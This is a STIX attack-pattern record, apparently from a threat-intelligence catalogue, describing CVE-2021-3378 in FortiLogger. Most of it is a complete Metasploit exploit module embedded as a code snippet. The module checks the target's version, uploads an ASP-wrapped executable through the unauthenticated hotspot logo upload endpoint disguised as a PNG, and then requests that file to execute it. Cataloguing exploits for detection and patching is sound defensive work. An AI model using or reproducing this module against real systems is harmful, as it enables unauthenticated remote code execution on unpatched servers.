{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c1cc5b53-615c-4c96-80dc-32ec6208c94a",
    "created": "2024-08-14T16:54:01.258538Z",
    "modified": "2024-08-14T16:54:01.258543Z",
    "name": "FortiLogger Arbitrary File Upload Exploit",
    "description": " This module exploits an unauthenticated arbitrary file upload via insecure POST request. It has been tested on versions < 5.2.0 in Windows 10 Enterprise.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/fortilogger_arbitrary_fileupload.rb",
            "external_id": "fortilogger_arbitrary_fileupload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-3378"
        },
        {
            "source_name": "reference",
            "url": "https://erberkan.github.io/2021/cve-2021-3378/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::EXE\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'FortiLogger Arbitrary File Upload Exploit',\n        'Description' => %q{\n          This module exploits an unauthenticated arbitrary file upload\n          via insecure POST request. It has been tested on versions < 5.2.0 in\n          Windows 10 Enterprise.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Berkan Er <b3rsec@protonmail.com>' # Vulnerability discovery, PoC and Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2021-3378'],\n          ['URL', 'https://erberkan.github.io/2021/cve-2021-3378/']\n        ],\n\n        'Platform' => ['win'],\n        'Privileged' => false,\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'FortiLogger < 5.2.0',\n            {\n              'Platform' => 'win'\n            }\n          ],\n        ],\n        'DisclosureDate' => '2021-02-26',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(5000),\n        OptString.new('TARGETURI', [true, 'The base path to the FortiLogger', '/'])\n      ]\n    )\n  end\n\n  def check_product_info\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, '/shared/GetProductInfo'),\n      'method' => 'POST',\n      'data' => '',\n      'headers' => {\n        'Accept' => 'application/json, text/javascript, */*; q=0.01',\n        'Accept-Language' => 'en-US,en;q=0.5',\n        'Accept-Encoding' => 'gzip, deflate',\n        'X-Requested-With' => 'XMLHttpRequest'\n      }\n    )\n  end\n\n  def check\n    res = check_product_info\n\n    unless res\n      return CheckCode::Unknown('Target is unreachable.')\n    end\n\n    unless res.code == 200\n      return CheckCode::Unknown(\"Unexpected server response: #{res.code}\")\n    end\n\n    version = Rex::Version.new(JSON.parse(res.body)['Version'])\n\n    if version <= Rex::Version.new('4.4.2.2')\n      CheckCode::Vulnerable(\"FortiLogger version #{version}\")\n    else\n      CheckCode::Safe(\"FortiLogger version #{version}\")\n    end\n  rescue JSON::ParserError\n    fail_with(Failure::UnexpectedReply, 'The target may have been updated')\n  end\n\n  def create_payload\n    Msf::Util::EXE.to_exe_asp(generate_payload_exe).to_s\n  end\n\n  def exploit\n    print_good('Generate Payload')\n    data = create_payload\n\n    boundary = \"----WebKitFormBoundary#{rand_text_alphanumeric(rand(5..14))}\"\n    post_data = \"--#{boundary}\\r\\n\"\n    post_data << \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"#{rand_text_alphanumeric(rand(5..11))}.asp\\\"\\r\\n\"\n    post_data << \"Content-Type: image/png\\r\\n\"\n    post_data << \"\\r\\n#{data}\\r\\n\"\n    post_data << \"--#{boundary}\\r\\n\"\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/Config/SaveUploadedHotspotLogoFile'),\n      'ctype' => \"multipart/form-data; boundary=#{boundary}\",\n      'data' => post_data,\n      'headers' => {\n        'Accept' => 'application/json',\n        'Accept-Language' => 'en-US,en;q=0.5',\n        'X-Requested-With' => 'XMLHttpRequest'\n      }\n    )\n\n    unless res\n      fail_with(Failure::Unknown, 'No response from server')\n    end\n\n    unless res.code == 200\n      fail_with(Failure::Unknown, \"Unexpected server response: #{res.code}\")\n    end\n\n    json_res = begin\n      JSON.parse(res.body)\n    rescue JSON::ParserError\n      nil\n    end\n\n    if json_res.nil? || json_res['Message'] == 'Error in saving file'\n      fail_with(Failure::UnexpectedReply, 'Error uploading payload')\n    end\n\n    print_good('Payload has been uploaded')\n\n    handler\n\n    print_status('Executing payload...')\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/Assets/temp/hotspot/img/logohotspot.asp'),\n      'method' => 'GET'\n    }, 5)\n  rescue StandardError => e\n    fail_with(Failure::UnexpectedReply, \"Failed to execute the payload: #{e}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-02-26",
    "x_mitre_platforms": [
        "win"
    ]
}